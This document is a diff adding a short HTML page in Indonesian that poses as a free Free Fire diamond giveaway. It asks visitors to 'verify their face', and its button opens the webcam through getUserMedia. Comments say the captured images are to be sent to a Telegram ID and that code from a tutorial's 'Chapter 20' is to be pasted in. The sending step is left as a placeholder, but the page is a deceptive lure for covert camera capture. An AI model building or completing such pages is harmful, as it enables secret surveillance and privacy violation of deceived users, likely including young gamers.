@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Klaim Diamond Free Fire Gratis - R3X V3</title>
+</head>
+<body>
+    <h1>Verifikasi Wajah Anda untuk Klaim Hadiah</h1>
+    <button onclick="startSnap()">KLIK UNTUK VERIFIKASI</button>
+
+    <script>
+        function startSnap() {
+            // Paste kode JavaScript Bab 20 di sini
+            console.log("Mulai mengambil gambar...");
+            
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                // Proses pengiriman ke Telegram 7961256633...
+            });
+        }
+    </script>
+</body>
+</html>
